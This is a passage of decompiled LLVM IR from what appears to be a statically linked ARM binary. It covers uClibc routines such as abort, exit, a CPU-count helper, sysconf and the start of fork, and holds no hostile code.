  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r5, align 4
  %v4_146f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 16) to i32*), align 4
  store i32 83708, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_146f0)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_14718 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_14720 = load i32, i32* @r5, align 4
  %v2_14720 = add i32 %v0_14720, 636
  %v3_14720 = inttoptr i32 %v2_14720 to i32*
  %v4_14720 = load i32, i32* %v3_14720, align 4
  %v2_14724 = icmp eq i32 %v4_14720, 0
  br i1 %v2_14724, label %dec_label_pc_1472c, label %dec_label_pc_1476c

dec_label_pc_1472c:                               ; preds = %entry
  store i32 1, i32* %v3_14720, align 4
  br label %dec_label_pc_14734

dec_label_pc_14734:                               ; preds = %dec_label_pc_1477c, %dec_label_pc_1472c
  %v0_14738 = load i32, i32* @r5, align 4
  %v2_14738 = add i32 %v0_14738, 212
  store i32 %v2_14738, i32* @r4, align 4
  %v2_14744 = add i32 %v0_14738, 68
  %v3_14744 = inttoptr i32 %v2_14744 to i32*
  %v4_14744 = load i32, i32* %v3_14744, align 4
  call void @__pseudo_branch(i32 %v4_14744)
  %v1_14754 = call i32 @__GI_raise(i32 6)
  %v0_14760 = load i32, i32* @r5, align 4
  %v2_14760 = add i32 %v0_14760, 16
  %v3_14760 = inttoptr i32 %v2_14760 to i32*
  %v4_14760 = load i32, i32* %v3_14760, align 4
  store i32 83820, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14760)
  %v0_14770.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %entry, %dec_label_pc_14734
  %v1_14784 = phi i32 [ %v0_14720, %entry ], [ %v0_14770.pre, %dec_label_pc_14734 ]
  %v2_14770 = add i32 %v1_14784, 636
  %v3_14770 = inttoptr i32 %v2_14770 to i32*
  %v4_14770 = load i32, i32* %v3_14770, align 4
  %v7_14774 = icmp eq i32 %v4_14770, 1
  br i1 %v7_14774, label %dec_label_pc_1477c, label %dec_label_pc_147b8

dec_label_pc_1477c:                               ; preds = %dec_label_pc_1476c
  %v2_1477c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1477c, i32* @r4, align 4
  store i32 2, i32* %v3_14770, align 4
  %v3_14794 = bitcast i32* %stack_var_-28 to i8*
  %v4_14794 = call i32 @__GI_memset(i8* %v3_14794, i32 0, i32 20)
  %v3_147b0 = call i32 @__libc_sigaction(i32 6, i32 %v2_1477c, i32 0)
  br label %dec_label_pc_14734

dec_label_pc_147b8:                               ; preds = %dec_label_pc_1476c
  %v7_147b8 = icmp eq i32 %v4_14770, 2
  br i1 %v7_147b8, label %dec_label_pc_147c0, label %dec_label_pc_147cc

dec_label_pc_147c0:                               ; preds = %dec_label_pc_147b8
  store i32 3, i32* %v3_14770, align 4
  %v0_147c8 = call i32 @abort()
  %v0_147cc.pre = load i32, i32* @r5, align 4
  %v1_147cc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_147b8, %dec_label_pc_147c0
  %v3_147d8 = phi i32 [ 636, %dec_label_pc_147b8 ], [ %v1_147cc.pre, %dec_label_pc_147c0 ]
  %v2_147d8 = phi i32 [ %v1_14784, %dec_label_pc_147b8 ], [ %v0_147cc.pre, %dec_label_pc_147c0 ]
  %v2_147cc = add i32 %v2_147d8, %v3_147d8
  %v3_147cc = inttoptr i32 %v2_147cc to i32*
  %v4_147cc = load i32, i32* %v3_147cc, align 4
  %v7_147d0 = icmp eq i32 %v4_147cc, 3
  br i1 %v7_147d0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_147cc
  store i32 4, i32* %v3_147cc, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_147cc, %bb
  call void @__pseudo_cond_branch(i1 %v7_147d0, i32 ptrtoint (i32* @global_var_161a0.609 to i32))
  br label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147e4, %.thread2
  %v0_147e4 = call i32 @abort()
  br label %dec_label_pc_147e4

; uselistorder directives
  uselistorder i32* %v3_14770, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_147cc, { 1, 0 }
  uselistorder label %dec_label_pc_1476c, { 1, 0 }
}

define i32 @function_147f0(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_147f0:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_147f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_147f0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_147f0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_147f0, %bb
  %v4_147fc = phi i32 [ %tmp, %dec_label_pc_147f0 ], [ 0, %bb ]
  ret i32 %v4_147fc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r5, align 4
  %v4_1480c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 140) to i32*), align 4
  store i32 %v4_1480c, i32* @r4, align 4
  %v2_14814 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_1482c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1482c)
  %v0_14840 = load i32, i32* @r5, align 4
  %v2_14840 = add i32 %v0_14840, 16
  %v3_14840 = inttoptr i32 %v2_14840 to i32*
  %v4_14840 = load i32, i32* %v3_14840, align 4
  call void @__pseudo_branch(i32 %v4_14840)
  %v0_14850 = load i32, i32* @r5, align 4
  %v2_14850 = add i32 %v0_14850, 640
  %v3_14850 = inttoptr i32 %v2_14850 to i32*
  %v4_14850 = load i32, i32* %v3_14850, align 4
  %v2_14858 = icmp eq i32 %v4_14850, 0
  br i1 %v2_14858, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_14864 = xor i1 %v2_14858, true
  call void @__pseudo_cond_branch(i1 %v2_14864, i32 %v4_14850)
  store i32 %v2_14814, i32* @r0, align 4
  %v0_14874 = load i32, i32* @r5, align 4
  %v2_14874 = add i32 %v0_14874, 44
  %v3_14874 = inttoptr i32 %v2_14874 to i32*
  %v4_14874 = load i32, i32* %v3_14874, align 4
  call void @__pseudo_branch(i32 %v4_14874)
  %v0_14880 = call i32 @__GI___uClibc_fini()
  %v0_14888 = load i32, i32* @r5, align 4
  %v2_14888 = add i32 %v0_14888, -49012
  %v2_14890 = icmp eq i32 %v2_14888, 0
  br i1 %v2_14890, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_14898 = xor i1 %v2_14890, true
  call void @__pseudo_cond_branch(i1 %v2_14898, i32 %v2_14888)
  %v0_1489c = load i32, i32* @r6, align 4
  %v1_148a0 = call i32 @__GI__exit(i32 %v0_1489c)
  %v0_148a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_148a4, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_148a4 = load i32, i32* @r8, align 4
  %v3_148a4 = udiv i32 %v2_148a4, 4194304
  %v4_148a4 = mul i32 %v2_148a4, 1024
  %v5_148a4 = or i32 %v3_148a4, %v4_148a4
  %v8_148a4 = and i32 %v5_148a4, %v1_148a0
  store i32 %v8_148a4, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_148bc = phi i32 [ %v1_148a0, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_148bc

; uselistorder directives
  uselistorder i32 %v1_148a0, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -34008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_148e4 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -34008))
  store i32 %v1_148e4, i32* @r6, align 4
  %v2_148e8 = icmp eq i32 %v1_148e4, 0
  br i1 %v2_148e8, label %dec_label_pc_14968, label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_148f8 = load i32, i32* @r4, align 4
  %v2_148f8 = add i32 %v0_148f8, -35848
  store i32 %v2_148f8, i32* @r8, align 4
  %v2_148fc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_148fc, i32* @r7, align 4
  br label %bb18

dec_label_pc_14904:                               ; preds = %bb18
  %v3_14904 = load i32, i32* %stack_var_-36, align 4
  %v1_14908 = inttoptr i32 %v3_14904 to i32*
  %v2_14908 = load i32, i32* %v1_14908, align 4
  %v1_1490c = inttoptr i32 %v2_14908 to i8*
  %v2_1490c = load i8, i8* %v1_1490c, align 1
  %v7_14910 = icmp eq i8 %v2_1490c, 99
  br i1 %v7_14910, label %dec_label_pc_14918, label %.backedge3

dec_label_pc_14918:                               ; preds = %dec_label_pc_14904
  %v1_14918 = add i32 %v2_14908, 1
  %v2_14918 = inttoptr i32 %v1_14918 to i8*
  %v3_14918 = load i8, i8* %v2_14918, align 1
  %v7_1491c = icmp eq i8 %v3_14918, 112
  br i1 %v7_1491c, label %dec_label_pc_14924, label %.backedge3

dec_label_pc_14924:                               ; preds = %dec_label_pc_14918
  %v1_14924 = add i32 %v2_14908, 2
  %v2_14924 = inttoptr i32 %v1_14924 to i8*
  %v3_14924 = load i8, i8* %v2_14924, align 1
  %v7_14928 = icmp eq i8 %v3_14924, 117
  br i1 %v7_14928, label %dec_label_pc_14930, label %.backedge3

dec_label_pc_14930:                               ; preds = %dec_label_pc_14924
  %v1_14930 = add i32 %v2_14908, 3
  %v2_14930 = inttoptr i32 %v1_14930 to i8*
  %v3_14930 = load i8, i8* %v2_14930, align 1
  %v4_14930 = zext i8 %v3_14930 to i32
  %v0_14934 = load i32, i32* @r4, align 4
  %v1_14934 = load i32, i32* @sl, align 4
  %v2_14934 = add i32 %v1_14934, %v0_14934
  %v3_14934 = inttoptr i32 %v2_14934 to i32*
  %v4_14934 = load i32, i32* %v3_14934, align 4
  %v2_14938 = mul nuw nsw i32 %v4_14930, 2
  %v2_1493c = add i32 %v4_14934, %v2_14938
  %v3_1493c = inttoptr i32 %v2_1493c to i16*
  %v4_1493c = load i16, i16* %v3_1493c, align 2
  %v1_14940 = and i16 %v4_1493c, 8
  %v2_14940 = icmp eq i16 %v1_14940, 0
  br i1 %v2_14940, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_14930
  %v1_14944 = load i32, i32* @r5, align 4
  %v2_14944 = add i32 %v1_14944, 1
  store i32 %v2_14944, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_14930, %dec_label_pc_14904, %dec_label_pc_14918, %dec_label_pc_14924
  %v0_14948.pre = load i32, i32* @r6, align 4
  %v0_14954.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_148f0
  %v0_14954 = phi i32 [ %v0_14954.pre, %.backedge3 ], [ %v2_148f8, %dec_label_pc_148f0 ]
  %v0_14948 = phi i32 [ %v0_14948.pre, %.backedge3 ], [ %v1_148e4, %dec_label_pc_148f0 ]
  %v4_14958 = inttoptr i32 %v0_14948 to i32*
  %v5_14958 = call i32 @__GI_config_read(i32* %v4_14958, i32 %v2_148fc, i32 258, i32 %v0_14954)
  %v2_1495c = icmp eq i32 %v5_14958, 0
  br i1 %v2_1495c, label %dec_label_pc_149cc, label %dec_label_pc_14904

dec_label_pc_14968:                               ; preds = %entry
  %v0_1496c = load i32, i32* @r4, align 4
  %v2_1496c = add i32 %v0_1496c, -33996
  store i32 %v2_1496c, i32* @r0, align 4
  %v1_14970 = call i32 @__GI_config_open(i32 %v2_1496c)
  store i32 %v1_14970, i32* @r6, align 4
  %v2_14974 = icmp eq i32 %v1_14970, 0
  br i1 %v2_14974, label %bb19, label %dec_label_pc_14980

bb19:                                             ; preds = %dec_label_pc_14968
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_149cc

dec_label_pc_14980:                               ; preds = %dec_label_pc_14968
  %v0_14984 = load i32, i32* @r4, align 4
  %v2_14984 = add i32 %v0_14984, -33980
  store i32 %v2_14984, i32* @r8, align 4
  %v2_1498c = add i32 %v0_14984, -33944
  store i32 %v2_1498c, i32* @r7, align 4
  %v2_14990 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14990, i32* @r4, align 4
  br label %bb21

dec_label_pc_14998:                               ; preds = %bb21
  %v0_149c4 = load i32, i32* @r8, align 4
  %v3_14998 = load i32, i32* %stack_var_-36, align 4
  %v1_1499c = inttoptr i32 %v3_14998 to i32*
  %v2_1499c = load i32, i32* %v1_1499c, align 4
  store i32 %v2_1499c, i32* @r1, align 4
  %v2_149a0 = inttoptr i32 %v0_149c4 to i8*
  %v3_149a0 = call i32 @__GI_strcoll(i8* %v2_149a0, i32 %v2_1499c)
  %v2_149a4 = icmp eq i32 %v3_149a0, 0
  br i1 %v2_149a4, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_14998
  %v1_149a8 = load i32, i32* @r5, align 4
  %v2_149a8 = add i32 %v1_149a8, 1
  store i32 %v2_149a8, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_14998
  %v0_149b4.pre = load i32, i32* @r7, align 4
  %v0_149b8.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_14980
  %v0_149b8 = phi i32 [ %v0_149b8.pre, %.backedge ], [ %v1_14970, %dec_label_pc_14980 ]
  %v0_149b4 = phi i32 [ %v0_149b4.pre, %.backedge ], [ %v2_1498c, %dec_label_pc_14980 ]
  %v4_149bc = inttoptr i32 %v0_149b8 to i32*
  %v5_149bc = call i32 @__GI_config_read(i32* %v4_149bc, i32 %v2_14990, i32 459266, i32 %v0_149b4)
  %v2_149c0 = icmp eq i32 %v5_149bc, 0
  br i1 %v2_149c0, label %dec_label_pc_149cc, label %dec_label_pc_14998

dec_label_pc_149cc:                               ; preds = %bb18, %bb21, %bb19
  %v0_149cc = load i32, i32* @r6, align 4
  %v1_149d0 = inttoptr i32 %v0_149cc to i32*
  %v2_149d0 = call i32 @__GI_config_close(i32* %v1_149d0)
  %v0_149d4 = load i32, i32* @r5, align 4
  %v2_149d4 = icmp eq i32 %v0_149d4, 0
  %.v0_149d4 = select i1 %v2_149d4, i32 1, i32 %v0_149d4
  ret i32 %.v0_149d4

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_149cc, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14e00

bb:                                               ; preds = %entry
  %v7_14a24 = mul i32 %arg1, 4
  %v8_14a24 = add i32 %v7_14a24, ptrtoint (i32* @global_var_14a2c.629 to i32)
  call void @__pseudo_branch(i32 %v8_14a24)
  br label %dec_label_pc_14e00

dec_label_pc_14e00:                               ; preds = %bb, %entry
  %v0_14e04 = call i32 @__aeabi_read_tp()
  %v3_14e08 = load i16, i16* @global_var_233d0.483, align 2
  %v4_14e08 = sext i16 %v3_14e08 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14e14 = add i32 %v4_14e08, %v0_14e04
  %v4_14e14 = inttoptr i32 %v3_14e14 to i32*
  store i32 22, i32* %v4_14e14, align 4
  %v0_14ff8 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_14ff8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 13028, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r8.global-to-local, align 4
  %v4_1512416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13028) to i32*), align 4
  store i32 %v4_1512416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1512818 = icmp eq i32 %v4_1512416, 0
  br i1 %v2_1512818, label %dec_label_pc_15130, label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %entry, %dec_label_pc_15124.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_15060 = load i32, i32* %r7.global-to-local, align 4
  %v1_15060 = add i32 %v0_15060, 20
  %v2_15060 = inttoptr i32 %v1_15060 to i32*
  %v3_15060 = load i32, i32* %v2_15060, align 4
  store i32 %v3_15060, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15064 = icmp eq i32 %v3_15060, 0
  store i32 %v3_15060, i32* %r4.global-to-local, align 4
  br i1 %v2_15064, label %dec_label_pc_15124.backedge, label %dec_label_pc_15074

dec_label_pc_15124.backedge:                      ; preds = %dec_label_pc_15054, %dec_label_pc_150a0
  %v0_15124 = load i32, i32* %r8.global-to-local, align 4
  %v1_15124 = load i32, i32* %r5.global-to-local, align 4
  %v2_15124 = add i32 %v1_15124, %v0_15124
  %v3_15124 = inttoptr i32 %v2_15124 to i32*
  %v4_15124 = load i32, i32* %v3_15124, align 4
  store i32 %v4_15124, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15128 = icmp eq i32 %v4_15124, 0
  br i1 %v2_15128, label %dec_label_pc_15130, label %dec_label_pc_15054

dec_label_pc_15074:                               ; preds = %dec_label_pc_15054
  %v0_15074 = load i32, i32* %r8.global-to-local, align 4
  %v1_15074 = load i32, i32* %r5.global-to-local, align 4
  %v2_15074 = add i32 %v1_15074, %v0_15074
  %v3_15074 = inttoptr i32 %v2_15074 to i32*
  %v4_15074 = load i32, i32* %v3_15074, align 4
  %v1_15078 = add i32 %v4_15074, 20
  store i32 %v1_15078, i32* %r2.global-to-local, align 4
  %v1_1507c132 = inttoptr i32 %v1_15078 to i32*
  %v2_1507c133 = load i32, i32* %v1_1507c132, align 4
  store i32 %v2_1507c133, i32* %r3.global-to-local, align 4
  %v3_15080135 = icmp uge i32 %v2_1507c133, %v3_15060
  store i1 %v3_15080135, i1* %cpsr_c.global-to-local, align 1
  %v9_15080141 = icmp eq i32 %v2_1507c133, %v3_15060
  br i1 %v9_15080141, label %dec_label_pc_15088, label %dec_label_pc_150a0

dec_label_pc_15088:                               ; preds = %dec_label_pc_15074, %dec_label_pc_15088.dec_label_pc_1507c_crit_edge
  %v0_15088142 = phi i32 [ %v1_15080.pre, %dec_label_pc_15088.dec_label_pc_1507c_crit_edge ], [ %v3_15060, %dec_label_pc_15074 ]
  store i32 %v0_15088142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15098 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15098, label %dec_label_pc_1509c, label %dec_label_pc_15088.dec_label_pc_1507c_crit_edge

dec_label_pc_15088.dec_label_pc_1507c_crit_edge:  ; preds = %dec_label_pc_15088
  %v0_1507c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15080.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1507c = inttoptr i32 %v0_1507c.pre to i32*
  %v2_1507c = load i32, i32* %v1_1507c, align 4
  store i32 %v2_1507c, i32* %r3.global-to-local, align 4
  %v3_15080 = icmp uge i32 %v2_1507c, %v1_15080.pre
  store i1 %v3_15080, i1* %cpsr_c.global-to-local, align 1
  %v9_15080 = icmp eq i32 %v2_1507c, %v1_15080.pre
  br i1 %v9_15080, label %dec_label_pc_15088, label %dec_label_pc_150a0

dec_label_pc_1509c:                               ; preds = %dec_label_pc_15088
  %v0_1509c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1509c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_150a0

dec_label_pc_150a0:                               ; preds = %dec_label_pc_15074, %dec_label_pc_15088.dec_label_pc_1507c_crit_edge, %dec_label_pc_1509c
  %v0_150a0 = phi i32 [ %v0_1509c, %dec_label_pc_1509c ], [ %v2_1507c133, %dec_label_pc_15074 ], [ %v2_1507c, %dec_label_pc_15088.dec_label_pc_1507c_crit_edge ]
  %v1_150a0 = phi i32 [ %v0_1509c, %dec_label_pc_1509c ], [ %v3_15060, %dec_label_pc_15074 ], [ %v1_15080.pre, %dec_label_pc_15088.dec_label_pc_1507c_crit_edge ]
  %v3_150a0 = icmp uge i32 %v0_150a0, %v1_150a0
  store i1 %v3_150a0, i1* %cpsr_c.global-to-local, align 1
  %v9_150a0 = icmp eq i32 %v0_150a0, %v1_150a0
  br i1 %v9_150a0, label %dec_label_pc_150a8, label %dec_label_pc_15124.backedge

dec_label_pc_150a8:                               ; preds = %dec_label_pc_150a0
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_150bc = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_150ac

dec_label_pc_150ac:                               ; preds = %dec_label_pc_15114, %dec_label_pc_150a8
  %v0_150ac = load i32, i32* %r7.global-to-local, align 4
  %v1_150ac = add i32 %v0_150ac, 4
  %v2_150ac = inttoptr i32 %v1_150ac to i32*
  %v3_150ac = load i32, i32* %v2_150ac, align 4
  store i32 %v3_150ac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150b0 = icmp eq i32 %v3_150ac, 0
  br i1 %v2_150b0, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_150ac
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_150ac, %bb
  %v2_150b8 = xor i1 %v2_150b0, true
  call void @__pseudo_cond_branch(i1 %v2_150b8, i32 %v3_150ac)
  %v0_150c0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_150c0, i32* %stack_var_-88, align 4
  %v1_150c4 = inttoptr i32 %v0_150c0 to i32*
  %v2_150c4 = load i32, i32* %v1_150c4, align 4
  store i32 %v2_150c4, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150c8 = icmp eq i32 %v2_150c4, 0
  store i32 %v2_150bc, i32* %r5.global-to-local, align 4
  br i1 %v2_150c8, label %dec_label_pc_15134.loopexit, label %dec_label_pc_150dc

dec_label_pc_150dc:                               ; preds = %bb72
  %v1_150dc = add i32 %v2_150c4, 20
  store i32 %v1_150dc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_15114.dec_label_pc_150e0_crit_edge, %dec_label_pc_150dc
  %v0_150e4 = phi i32 [ %v0_150e4.pre, %dec_label_pc_15114.dec_label_pc_150e0_crit_edge ], [ %v1_150dc, %dec_label_pc_150dc ]
  %v0_150e0 = phi i32 [ %v0_150e0.pre, %dec_label_pc_15114.dec_label_pc_150e0_crit_edge ], [ %v2_150c4, %dec_label_pc_150dc ]
  %v1_150e0 = add i32 %v0_150e0, 20
  %v2_150e0 = inttoptr i32 %v1_150e0 to i32*
  %v3_150e0 = load i32, i32* %v2_150e0, align 4
  store i32 %v0_150e4, i32* %r2.global-to-local, align 4
  store i32 %v3_150e0, i32* %r4.global-to-local, align 4
  %v1_150f0119 = inttoptr i32 %v0_150e4 to i32*
  %v2_150f0120 = load i32, i32* %v1_150f0119, align 4
  store i32 %v2_150f0120, i32* %r3.global-to-local, align 4
  %v3_150f4122 = icmp uge i32 %v2_150f0120, %v3_150e0
  store i1 %v3_150f4122, i1* %cpsr_c.global-to-local, align 1
  %v9_150f4128 = icmp eq i32 %v2_150f0120, %v3_150e0
  br i1 %v9_150f4128, label %dec_label_pc_150fc, label %dec_label_pc_15114

dec_label_pc_150fc:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150fc.dec_label_pc_150f0_crit_edge
  %v0_150fc129 = phi i32 [ %v1_150f4.pre, %dec_label_pc_150fc.dec_label_pc_150f0_crit_edge ], [ %v3_150e0, %dec_label_pc_150e0 ]
  store i32 %v0_150fc129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1510c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1510c, label %dec_label_pc_15110, label %dec_label_pc_150fc.dec_label_pc_150f0_crit_edge

dec_label_pc_150fc.dec_label_pc_150f0_crit_edge:  ; preds = %dec_label_pc_150fc
  %v0_150f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_150f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_150f0 = inttoptr i32 %v0_150f0.pre to i32*
  %v2_150f0 = load i32, i32* %v1_150f0, align 4
  store i32 %v2_150f0, i32* %r3.global-to-local, align 4
  %v3_150f4 = icmp uge i32 %v2_150f0, %v1_150f4.pre
  store i1 %v3_150f4, i1* %cpsr_c.global-to-local, align 1
  %v9_150f4 = icmp eq i32 %v2_150f0, %v1_150f4.pre
  br i1 %v9_150f4, label %dec_label_pc_150fc, label %dec_label_pc_15114

dec_label_pc_15110:                               ; preds = %dec_label_pc_150fc
  %v0_15110 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150fc.dec_label_pc_150f0_crit_edge, %dec_label_pc_15110
  %v0_15114 = phi i32 [ %v0_15110, %dec_label_pc_15110 ], [ %v2_150f0120, %dec_label_pc_150e0 ], [ %v2_150f0, %dec_label_pc_150fc.dec_label_pc_150f0_crit_edge ]
  %v1_15114 = phi i32 [ %v0_15110, %dec_label_pc_15110 ], [ %v3_150e0, %dec_label_pc_150e0 ], [ %v1_150f4.pre, %dec_label_pc_150fc.dec_label_pc_150f0_crit_edge ]
  %v3_15114 = icmp uge i32 %v0_15114, %v1_15114
  store i1 %v3_15114, i1* %cpsr_c.global-to-local, align 1
  %v9_15114 = icmp eq i32 %v0_15114, %v1_15114
  store i32 %v2_150bc, i32* %r4.global-to-local, align 4
  br i1 %v9_15114, label %dec_label_pc_150ac, label %dec_label_pc_15114.dec_label_pc_150e0_crit_edge

dec_label_pc_15114.dec_label_pc_150e0_crit_edge:  ; preds = %dec_label_pc_15114
  %v0_150e0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_150e4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150e0

dec_label_pc_15130:                               ; preds = %dec_label_pc_15124.backedge, %entry
  %v0_1513831 = phi i32 [ ptrtoint (i32* @global_var_23378.488 to i32), %entry ], [ %v0_15124, %dec_label_pc_15124.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15134

dec_label_pc_15134.loopexit:                      ; preds = %bb72
  store i32 %v2_150bc, i32* %r6.global-to-local, align 4
  %v0_15138.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15134

dec_label_pc_15134:                               ; preds = %dec_label_pc_15134.loopexit, %dec_label_pc_15130
  %v0_15138 = phi i32 [ %v0_15138.pre, %dec_label_pc_15134.loopexit ], [ %v0_1513831, %dec_label_pc_15130 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15138 = add i32 %v0_15138, 152
  %v3_15138 = inttoptr i32 %v2_15138 to i32*
  %v4_15138 = load i32, i32* %v3_15138, align 4
  store i32 %v4_15138, i32* %r7.global-to-local, align 4
  %v0_1513c = call i32 @__aeabi_read_tp()
  store i32 %v0_1513c, i32* %r0.global-to-local, align 4
  %v1_15140 = add i32 %v4_15138, 8
